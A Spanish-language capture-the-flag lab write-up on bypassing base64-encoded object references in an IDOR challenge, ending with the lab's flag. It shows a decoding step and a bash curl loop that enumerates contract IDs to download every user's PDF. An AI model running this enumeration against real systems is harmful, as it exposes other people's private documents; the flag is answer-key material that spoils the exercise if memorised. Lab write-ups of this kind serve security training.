# Laboratorio: Bypass Encoding References 🤗

1. Visitamos la web 

<p align="center">
    <img src="./assets/03-Mass_IDOR/01-Web.PNG" width=400>
</p>

---

2. Como nos piden descargar todos los contratos, lo que haremos es interceptar, justamente, esa petición.

* `http://[IP]:[Port]/contracts.php` -> Clic en `Enployment_contract.pdf`

<p align="center">
    <img src="./assets/04-Bypass_Encoding/01-Burpsuite.PNG" width=400>
</p>

* Si nos fijamos bien, el número de **`contrato`** se manda encodedado en **base64**
* `%3D` -> `=` 

* **Decodeamos en base64:** `echo -n "MQ==" | base64 -d` -> `1`

---

3. Por lo que si realizamos una petición por **GET** y enviamos el número de contrato encodeado en **`base64`** seremos capaces de descargar los **pdfs**

* `docs.sh`
```sh
#!/bin/bash

url="http://[IP]:[Port]/"

for i in {1..20}; do
    curl -sJ -X GET "$url/download.php?contract=$(echo -n $i | base64 -w 0)"
done
```
* `-sJ`: `s` -> No veremos el **output** de **cURL**, `-J` Si en la respuesta vemos un nombre de archivo, lo usamos en el archivo que vayamos a descargar.
* `-O`: Si queremos descargar los archivos utilizamos esta opción.

* **Output**
```
HTB{h45h1n6_1d5_w0n7_570p_m3}
```